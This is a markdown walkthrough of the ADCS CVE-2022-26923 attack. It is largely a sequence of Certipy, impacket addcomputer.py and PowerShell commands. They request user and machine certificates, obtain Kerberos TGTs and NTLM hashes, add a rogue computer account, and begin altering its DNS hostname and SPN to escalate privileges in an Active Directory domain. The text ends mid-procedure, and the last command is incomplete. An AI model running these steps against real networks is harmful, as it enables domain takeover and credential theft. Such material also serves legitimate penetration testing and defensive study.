# Active Directory Certificate Services (ADCS) CVE-2022-26923

This attack relies on ADCS being available within the internal active directory network you are attempting to compromise. Furthermore, a low privieged domain user account will be required for the steps in the attack path.

With the low privileged user credentials, search for the ADCS server within the active directory domain. This can be done by running `certutil.exe` within Microsoft Windows, or by using `Certipy.py`, which is available from https://github.com/ly4k/Certipy. Certipy requires Python 3 and also impacket to be installed. If this attack is ran from a Kali Linux machine attached to the network, the dependencies should come preinstalled.

*Note that ADCS does not have to be running on the domain controller, and quite often it will be ran on its own server instance*

Use certipy to discover the details of the ADCS server within the domain. The following command will list the details of the Certificate Authority "CA" within the AD environment, along with what certificate templates are available:

```
certipy.py find 'domain.local/username:password@dc1.adcs-server.domain.local'
```

Now a certificate can be generated for the current user using Certipy and the "User" template. This will then download a ".pfx" certificate file. The name of the CA can be found from the output of the `Certipy.py find` command or `certutil.exe`

```
certipy.py req 'domain.local/username:password@dc1.adcs-server.domain.local' -ca "Name Of CA" -template user
```

Now a TGT can be obtained for the user using Certipy. The following command will generate a CCACHE file containing a Kerberos TGT for the user "username". THe command will output the CCACHE file, along with the NTLM hash for the user.

```
certipy.py auth -pfx username.pfx
```

Now impacket can be used to add a new computer object to the active directory domain. In a default active directory configuration, a standard user can add up to 10 machine accounts. Providing the user can add a machine account to the domain, `addcomputer.py` can be used:

`addcomputer.py 'domain.local/username:password' -method LDAPS -computer-name NEW-PC -computer-password Password123!`

Now with the new computer added to the domain, a machine certificate can be requested from the ADCS server:

```
certipy.py req 'domain.local/NEW-PC$:Password123!@dc1.adcs-server.domain.local' -ca "Name Of CA" -template Machine'
```

The certificate will download as a ".pfx" file with the `NEW-PC.pfx`. Now a TGT can be created for the machine account, which will output a CCACHE file:

```
certipy auth -pfx NEW-PC.pfx
```

On a Windows host on the target environment, the following commands can now be ran in powershell to make modifications to the DNS hostname. First look at the dnshostname and service princlpal name:

```powershell
Get-ADComputer NEW-PC -properties dnshostname,serviceprincipalname
```

First, delete the serviceprincipalname using the following powershell command:

```powershell
Set-ADComputer NEW-PC @{}
```
